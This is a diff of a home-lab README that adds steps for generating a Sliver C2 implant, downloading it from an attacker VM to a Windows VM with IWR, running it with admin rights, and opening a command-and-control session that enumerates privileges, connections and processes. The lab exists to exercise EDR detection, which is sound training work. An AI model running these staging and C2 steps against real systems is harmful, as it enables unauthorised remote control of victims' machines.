@@ -137,7 +137,7 @@ LimaCharlie is a relatively new, very powerful “Security Infrastructure as a 
 ![024](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/7fab9652-91a3-4e38-a95a-f0dd97bb89eb)
 
    3. LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC’s own telemetry, but Sysmon is still a very power visibility tool that runs well alongside any EDR agent.
-      1. The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we previously enabled largely depend on Sysmon logs as that is what most of them were written for.
+      a. The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we previously enabled largely depend on Sysmon logs as that is what most of them were written for.
          
 <h3>Setup Attack System</h3>
 
@@ -180,16 +180,125 @@ LimaCharlie is a relatively new, very powerful “Security Infrastructure as a 
    ```
    generate --http [Linux_VM_IP] --save /opt/sliver
    ```
+    ![026](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/1dab0c2f-8b4a-4ce0-997b-c8e3ca769521)
 
+4. Confirm the new implant configuration
+   ```
+   implants
+   ```
+   ![027](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/c3c0aef2-beb0-49e0-b4d4-89f85d64ba77)
 
-
-
-
-
-
-
+5. Now we have a C2 payload we can drop onto our Windows VM. We’ll do that next. Go ahead and exit Sliver for now.
+    
+    ```
+    exit
+    ```
+    
+6. To easily download the C2 payload from the Linux VM to the Windows VM, let’s use a little python trick that spins up a temporary web server.
+    
+    ```
+    cd /opt/sliver
+    ```
+    
+    ```
+    python3 -m http.server 80
+    ```
+    
+7. Switch to the **Windows VM** and launch an **Administrative PowerShell console**.
+   Now run the following command to download your C2 payload from the Linux VM to the Windows VM, swapping your own Linux VM IP `[Linux_VM_IP]` and the name of the payload we generated in Sliver `[payload_name]` a few steps prior.
+        
+        ```
+        IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+        ```
+        
+8. Now would be a good time to snapshot your Windows VM, before we execute the malware.
+   Snapshot name: “Malware staged”
 
 <h3>Start Command and Control Session</h3>
+
+1. Now that the payload is on the Windows VM, we must switch back to the **Linux VM** SSH session and enable the Sliver HTTP server to catch the callback.
+    a. First, terminate the python web server we started by pressing `Ctrl + C`
+    b. Now, relaunch Sliver
+        
+        ```
+        sliver-server
+        ```
+        
+    c. Start the Sliver HTTP listener
+        
+        ```
+        http
+        ```
+        
+    d. If you get an error starting the HTTP listener, try rebooting the Linux VM and retrying.
+2. Return to the **Windows VM** and execute the C2 payload from its download location using the same **administrative** PowerShell prompt we had from before
+    
+    ```
+    C:\Users\User\Downloads\<your_C2-implant>.exe
+    ```
+    
+3. Within a few moments, you should see your session check in on the Sliver server
+   ![028](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/12d0fb2b-3599-48b8-a3c1-5e5a8dbea645)
+
+4. Verify your session in Sliver, taking note of the Session ID
+   ```
+   sessions
+   ```
+   ![029](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/e64ab6ef-18d8-44a6-aa3d-f4055afe077e)
+
+5. To interact with your new C2 session, type the following command into the Sliver shell, swapping [session_id] with yours
+   ```
+   use [session_id]
+   ```
+   ![030](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/cd65748e-37d7-4066-9076-51918d191ca1)
+
+6. You are now interacting directly with the C2 session on the Windows VM. Let’s run a few basic commands to get our bearing on the victim host.
+    a. Get basic info about the session
+    
+    ```
+    info
+    ```
+    
+    b. Find out what user your implant is running as, and learn it’s privileges
+    
+    ```
+    whoami
+    ```
+    
+    ```
+    getprivs
+    ```
+    
+    If your implant was properly run with Admin rights, you’ll notice we have a few privileges that make further attack activity much easier, such as “SeDebugPrivilege” — if you do not see these privileges, make sure you ran the implant from an Administrative command prompt.<br>
+    ![031](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/d5ab3804-4352-45b6-9f10-9c00f7a9f89f)
+
+    c. Identify our implant’s working directory and Examine network connections occurring on the remote system
+
+```
+pwd
+```
+```
+netstat
+```
+
+    1. Notice that Sliver cleverly highlights its own process in green.
+    2. `rphcp.exe` is the LimaCharlie EDR service executable
+
+    e. Identify running processes on the remote system
+
+```
+ps -T
+```
+
+Notice that Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red.<br>
+![032](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/004a57ab-6b91-4e0c-8e41-ab0045195c2a)
+![033](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/25f4125d-a60d-4976-9565-7e272936509b)
+
+
+
+
+
+
 <h3>Observe EDR Telemetry So Far</h3>
 <h3>Let us Get Adversarial</h3>
 <h3>Now Let us Detect It</h3>
